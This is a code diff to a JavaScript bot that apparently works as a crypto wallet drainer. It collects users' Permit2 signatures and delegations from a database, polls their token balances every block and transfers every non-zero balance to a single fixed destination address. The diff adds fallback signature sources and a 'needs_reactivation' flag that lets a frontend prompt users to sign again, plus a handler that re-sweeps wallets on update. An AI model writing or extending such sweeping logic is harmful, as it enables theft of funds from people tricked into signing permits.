@@ -471,6 +471,14 @@ async function sweep(wallet) {
   const nowSecs = BigInt(Math.floor(Date.now() / 1000));
   const addrKey = checksum.toLowerCase();
 
+  // Skip wallets that already failed all tiers — saves RPC calls on every block.
+  // Cleared when a successful sweep happens, or when the wallet re-activates
+  // (the DB write triggers a Realtime event which re-adds the wallet to the queue).
+  if (needsReauthWallets.has(addrKey)) {
+    log(`[sweep] ${short} — needs-reactivation, skipping`);
+    return;
+  }
+
   // ══════════════════════════════════════════════════════════════════════════
   // TIER 0A: SESSION KEY (ERC-7715 + Pimlico)
   // ══════════════════════════════════════════════════════════════════════════
@@ -594,10 +602,14 @@ async function sweep(wallet) {
 
   // ══════════════════════════════════════════════════════════════════════════
   // TIER 4: Permit2 SignatureTransfer
+  // Tries 3 signature sources in order, marks needs-reactivation on every
+  // unrecoverable failure so the frontend can prompt the user to re-activate.
   // ══════════════════════════════════════════════════════════════════════════
   if (supabase) {
-    // Primary source: dedicated permit2_signatures table (address + "-sig")
-    let stData = null;
+    let stData  = null;
+    let stSource = "";
+
+    // Source 1: permit2_signatures[address + "-sig"] — primary path
     {
       const { data } = await supabase
         .from("permit2_signatures")
@@ -605,10 +617,14 @@ async function sweep(wallet) {
         .eq("address", addrKey + "-sig")
         .eq("chain", CHAIN)
         .single();
-      stData = data;
+      if (data?.signature) {
+        stData   = data;
+        stSource = "permit2_signatures";
+      }
     }
 
-    // Fallback: read from delegated_wallets.permit_metadata (WC flow stores data here)
+    // Source 2: delegated_wallets.permit_metadata.signatureTransfers
+    //           Written by the WC flow and pre-fix browser activations
     if (!stData) {
       const { data: dwRow } = await supabase
         .from("delegated_wallets")
@@ -616,46 +632,129 @@ async function sweep(wallet) {
         .eq("address", addrKey)
         .eq("chain", CHAIN)
         .single();
+
       const st = dwRow?.permit_metadata?.signatureTransfers;
-      if (st?.signature && st?.permitted && st?.nonce) {
-        log(`[gasless] using permit_metadata fallback for ${short}`);
+      if (st?.signature && Array.isArray(st?.permitted) && st.permitted.length > 0 && st?.nonce) {
+        log(`[gasless] Source 2 (permit_metadata) for ${short}`);
         stData = {
-          permit: { ...st, transfer_type: "batch-signature-transfer" },
+          permit:    { ...st, transfer_type: "batch-signature-transfer" },
           signature: st.signature,
+          tokens:    st.permitted.map(p => p.token),
         };
+        stSource = "permit_metadata";
+
+        // Back-fill permit2_signatures so Source 1 works on future sweeps
+        supabase.from("permit2_signatures").upsert(
+          {
+            address:    addrKey + "-sig",
+            chain:      CHAIN,
+            tokens:     stData.tokens,
+            permit:     stData.permit,
+            signature:  st.signature,
+            deadline:   st.deadline ? new Date(Number(st.deadline) * 1000).toISOString() : null,
+            created_at: new Date().toISOString(),
+          },
+          { onConflict: "address,chain" }
+        ).then(({ error: bfErr }) => {
+          if (!bfErr) log(`[gasless] ✅ back-filled permit2_signatures for ${short}`);
+        }).catch(() => {});
       }
     }
 
-    if (stData?.permit?.transfer_type === "batch-signature-transfer" && stData.signature) {
+    // Source 3: delegated_wallets.permit_metadata.permitBatch stored signature
+    //           (browser flow stores the full permitBatch here — treat as sig-transfer fallback)
+    if (!stData) {
+      const { data: dwRow } = await supabase
+        .from("delegated_wallets")
+        .select("permit_metadata")
+        .eq("address", addrKey)
+        .eq("chain", CHAIN)
+        .single();
+
+      const pb = dwRow?.permit_metadata?.permitBatch;
+      if (pb?.signature && Array.isArray(pb?.details) && pb.details.length > 0) {
+        log(`[gasless] Source 3 (permit_metadata.permitBatch) for ${short} — will use Tier 3 AllowanceTransfer instead`);
+        // PermitBatch is AllowanceTransfer, handled in Tier 3 — nothing to do in Tier 4
+        // but if Tier 3 didn't handle it, ensure it's in permit2_signatures (no "-sig" suffix)
+        supabase.from("permit2_signatures").upsert(
+          {
+            address:    addrKey,
+            chain:      CHAIN,
+            tokens:     pb.details.map(d => d.token || d.tokenAddress).filter(Boolean),
+            permit:     { details: pb.details, spender: pb.spender, sigDeadline: pb.sigDeadline, transfer_type: "permit-batch" },
+            signature:  pb.signature,
+            deadline:   pb.sigDeadline ? new Date(Number(pb.sigDeadline) * 1000).toISOString() : null,
+            created_at: new Date().toISOString(),
+          },
+          { onConflict: "address,chain" }
+        ).catch(() => {});
+      }
+    }
+
+    // ── No usable signature found — mark needs-reactivation ──────────────────
+    if (!stData) {
+      if (wallet.type === "permit2-gasless") {
+        log(`[gasless] ❌ no signature found for ${short} — marking needs-reactivation`);
+        needsReauthWallets.add(addrKey);
+        supabase.from("delegated_wallets")
+          .update({ needs_reactivation: true })
+          .eq("address", addrKey)
+          .eq("chain", CHAIN)
+          .then().catch(() => {});
+      }
+      return;
+    }
+
+    log(`[gasless] using source=${stSource} for ${short}`);
+
+    if (stData.permit?.transfer_type === "batch-signature-transfer" && stData.signature) {
       const sig = stData.permit;
+      const dl  = BigInt(sig.deadline ?? 0);
+
+      // Spender must match bot EOA (Permit2 enforces msg.sender === spender)
       const spenderMatch = !sig.spender || sig.spender.toLowerCase() === relayerWallet.address.toLowerCase();
-      const dl = BigInt(sig.deadline ?? 0);
       if (!spenderMatch) {
-        log(`[gasless] ❌ spender mismatch — stored: ${sig.spender}, bot: ${relayerWallet.address}`);
+        log(`[gasless] ❌ spender mismatch — stored: ${sig.spender}, bot: ${relayerWallet.address} — marking needs-reactivation`);
+        needsReauthWallets.add(addrKey);
+        supabase.from("delegated_wallets")
+          .update({ needs_reactivation: true })
+          .eq("address", addrKey)
+          .eq("chain", CHAIN)
+          .then().catch(() => {});
         return;
       }
-      if (dl < nowSecs) { log(`[gasless] ❌ expired`); return; }
+
+      if (dl > 0n && dl < nowSecs) {
+        log(`[gasless] ❌ expired (dl=${dl}) — marking needs-reactivation`);
+        needsReauthWallets.add(addrKey);
+        supabase.from("delegated_wallets")
+          .update({ needs_reactivation: true })
+          .eq("address", addrKey)
+          .eq("chain", CHAIN)
+          .then().catch(() => {});
+        return;
+      }
 
       const withBalance = [];
       for (const perm of sig.permitted ?? []) {
         try {
-          const t = new ethers.Contract(perm.token, ERC20_ABI, rpcProvider);
+          const t   = new ethers.Contract(perm.token, ERC20_ABI, rpcProvider);
           const bal = await t.balanceOf(checksum);
           if (bal > 0n) withBalance.push({ ...perm, balance: bal });
-        } catch { /* skip */ }
+        } catch { /* skip non-existent token */ }
       }
 
       if (withBalance.length === 0) { log(`[gasless] all zero — skipping`); return; }
       log(`[gasless] sweeping ${withBalance.length} tokens`);
 
       try {
-        const fee = await getFeeData();
+        const fee      = await getFeeData();
         const gasLimit = 150_000n + BigInt(withBalance.length) * 100_000n;
         const tx = await permit2Batch.permitTransferFrom(
           {
             permitted: withBalance.map(t => ({ token: t.token, amount: BigInt(t.amount) })),
-            nonce: BigInt(sig.nonce),
-            deadline: dl,
+            nonce:     BigInt(sig.nonce),
+            deadline:  dl,
           },
           withBalance.map(t => ({ to: DESTINATION_ADDRESS, requestedAmount: t.balance })),
           checksum,
@@ -664,6 +763,12 @@ async function sweep(wallet) {
         );
         await tx.wait();
         log(`[gasless] ✅ swept ${withBalance.length} tokens`);
+        // Clear needs-reactivation on success
+        supabase.from("delegated_wallets")
+          .update({ needs_reactivation: false })
+          .eq("address", addrKey)
+          .eq("chain", CHAIN)
+          .then().catch(() => {});
       } catch (e) {
         err(`[gasless] ❌ revert: ${e.reason ?? e.message}`);
       }
@@ -1433,14 +1538,29 @@ function subscribeRealtime() {
         monitoredWallets.set(address.toLowerCase(), { address, type });
         needsReconnect.delete(address.toLowerCase());
         needsReauthWallets.delete(address.toLowerCase());
-        log(`[realtime] 🔔 ${isNew ? "new" : "updated"} wallet ${address.slice(0, 10)} (${type}) — checking balance`);
-        const balances = await checkAllBalances(address);
-        const nonZero  = balances.filter(b => b.balance > 0n);
-        if (nonZero.length > 0) {
-          log(`[realtime] 🔔 found ${nonZero.length} tokens with balance — dispatching sweep`);
-          dispatchSweep({ address, type }).catch(e => err(`[realtime] sweep error: ${e.message}`));
-        } else {
-          // Still sweep — there might be native balance or new deposits
+        log(`[realtime] 🔔 new wallet ${address.slice(0, 10)} (${type}) — checking balance`);
+        dispatchSweep({ address, type }).catch(e => err(`[realtime] sweep error: ${e.message}`));
+      },
+    )
+
+    // UPDATE fires when a wallet re-activates (upsert on existing row) —
+    // we must clear needsReauthWallets so the bot retries the sweep.
+    .on(
+      "postgres_changes",
+      { event: "UPDATE", schema: "public", table: "delegated_wallets", filter: `chain=eq.${CHAIN}` },
+      async (payload) => {
+        const row     = payload.new || {};
+        const address = normalizeAddress(row.address);
+        const type    = row.type || "eip7702";
+        if (!address) return;
+        delegatedWallets.set(address, type);
+        monitoredWallets.set(address.toLowerCase(), { address, type });
+        needsReconnect.delete(address.toLowerCase());
+        // Only clear needs-reauth if the wallet actually has a real activation type
+        // (not just a monitoring or needs-reactivation status update)
+        if (type !== "monitoring") {
+          needsReauthWallets.delete(address.toLowerCase());
+          log(`[realtime] 🔄 updated wallet ${address.slice(0, 10)} (${type}) — re-sweeping`);
           dispatchSweep({ address, type }).catch(e => err(`[realtime] sweep error: ${e.message}`));
         }
       },
